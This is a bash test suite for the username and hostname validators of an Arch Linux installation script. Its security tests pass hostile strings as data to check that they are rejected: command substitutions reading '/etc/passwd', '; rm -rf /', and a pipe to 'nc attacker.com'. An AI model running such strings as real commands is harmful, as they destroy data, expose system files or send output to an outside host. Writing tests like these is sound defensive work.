#!/bin/bash

# Comprehensive Test Suite for Arch Linux Installation Script
# Tests validation functions and core functionality of archinstall.sh

set -euo pipefail

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

#######################################
# Validation Functions (copied from archinstall.sh)
#######################################

validate_username() {
    local username="$1"
    # Must start with lowercase letter or underscore
    # Can contain lowercase letters, numbers, underscores, and hyphens
    # Maximum 32 characters
    if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]*$ ]]; then
        return 1
    fi
    if [[ ${#username} -gt 32 ]]; then
        return 1
    fi
    return 0
}

validate_hostname() {
    local hostname="$1"
    # Must start and end with alphanumeric character
    # Can contain alphanumeric characters and hyphens
    # Maximum 63 characters per label
    if [[ ! "$hostname" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$ ]]; then
        return 1
    fi
    return 0
}

#######################################
# Test Framework
#######################################

print_header() {
    echo -e "${BLUE}$1${NC}"
    echo "$(printf '%*s' ${#1} | tr ' ' '=')"
}

print_test_result() {
    local test_name="$1"
    local result="$2"
    local reason="${3:-}"
    
    ((TESTS_RUN++))
    
    if [[ "$result" == "PASS" ]]; then
        echo -e "${GREEN}✓ PASS${NC}: $test_name"
        ((TESTS_PASSED++))
    else
        echo -e "${RED}✗ FAIL${NC}: $test_name${reason:+ - $reason}"
        ((TESTS_FAILED++))
    fi
}

run_username_test() {
    local username="$1"
    local should_pass="$2"
    local test_name="Username '$username'"
    
    if validate_username "$username"; then
        if [[ "$should_pass" == "true" ]]; then
            print_test_result "$test_name should be valid" "PASS"
        else
            print_test_result "$test_name should be invalid" "FAIL" "was accepted"
        fi
    else
        if [[ "$should_pass" == "false" ]]; then
            print_test_result "$test_name should be invalid" "PASS"
        else
            print_test_result "$test_name should be valid" "FAIL" "was rejected"
        fi
    fi
}

run_hostname_test() {
    local hostname="$1"
    local should_pass="$2"
    local test_name="Hostname '$hostname'"
    
    if validate_hostname "$hostname"; then
        if [[ "$should_pass" == "true" ]]; then
            print_test_result "$test_name should be valid" "PASS"
        else
            print_test_result "$test_name should be invalid" "FAIL" "was accepted"
        fi
    else
        if [[ "$should_pass" == "false" ]]; then
            print_test_result "$test_name should be invalid" "PASS"
        else
            print_test_result "$test_name should be valid" "FAIL" "was rejected"
        fi
    fi
}

#######################################
# Test Data and Execution
#######################################

main() {
    print_header "Arch Linux Installation Script - Validation Test Suite"
    echo
    
    # Username validation tests
    print_header "Username Validation Tests"
    
    # Valid usernames
    run_username_test "user" "true"
    run_username_test "testuser" "true"
    run_username_test "test_user" "true"
    run_username_test "user123" "true"
    run_username_test "a" "true"
    run_username_test "user-name" "true"
    run_username_test "_test" "true"
    run_username_test "arch" "true"
    
    # Invalid usernames
    run_username_test "User" "false"           # Capital letter
    run_username_test "123user" "false"        # Starts with number
    run_username_test "user@" "false"          # Special character
    run_username_test "user space" "false"     # Contains space
    run_username_test "" "false"               # Empty string
    run_username_test "user.name" "false"      # Contains dot
    run_username_test "-user" "false"          # Starts with dash
    run_username_test "user-" "true"           # Ends with dash (should be valid)
    
    # Long username (should fail)
    run_username_test "verylongusernamethatistoolongtobevalidbecauseitexceedsthirtytwocharacters" "false"
    
    echo
    
    # Hostname validation tests
    print_header "Hostname Validation Tests"
    
    # Valid hostnames
    run_hostname_test "arch" "true"
    run_hostname_test "my-computer" "true"
    run_hostname_test "host1" "true"
    run_hostname_test "test-123" "true"
    run_hostname_test "a" "true"
    run_hostname_test "z" "true"
    run_hostname_test "server01" "true"
    run_hostname_test "web-01" "true"
    
    # Invalid hostnames
    run_hostname_test "-arch" "false"          # Starts with dash
    run_hostname_test "arch-" "false"          # Ends with dash
    run_hostname_test "arch_host" "false"      # Contains underscore
    run_hostname_test "arch host" "false"      # Contains space
    run_hostname_test "" "false"               # Empty string
    run_hostname_test "arch.host" "false"      # Contains dot
    run_hostname_test "arch@host" "false"      # Contains special character
    
    # Long hostname (should fail)
    run_hostname_test "verylonghostnamethatistoolongtobevalidbecauseitexceedssixtythreecharacters" "false"
    
    echo
    
    # Edge cases
    print_header "Edge Case Tests"
    
    # Single character tests
    run_username_test "a" "true"
    run_username_test "z" "true"
    run_username_test "_" "true"
    run_hostname_test "a" "true"
    run_hostname_test "Z" "true"
    run_hostname_test "9" "true"
    
    # Boundary length tests
    local max_username="$(printf 'a%.0s' {1..32})"  # 32 chars
    local over_max_username="$(printf 'a%.0s' {1..33})"  # 33 chars
    run_username_test "$max_username" "true"
    run_username_test "$over_max_username" "false"
    
    echo
    
    # Security tests
    print_header "Security Tests"
    
    # Test potentially malicious inputs
    run_username_test "\$(whoami)" "false"
    run_username_test "\`id\`" "false"
    run_username_test "; rm -rf /" "false"
    run_username_test "| nc attacker.com" "false"
    run_hostname_test "\$(cat /etc/passwd)" "false"
    run_hostname_test "../../../etc" "false"
    
    echo
    
    # Print summary
    print_header "Test Summary"
    echo "Total Tests: $TESTS_RUN"
    echo -e "Passed: ${GREEN}$TESTS_PASSED${NC}"
    echo -e "Failed: ${RED}$TESTS_FAILED${NC}"
    
    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo -e "${GREEN}All tests passed!${NC}"
        return 0
    else
        echo -e "${RED}Some tests failed!${NC}"
        return 1
    fi
}

# Run tests
main "$@"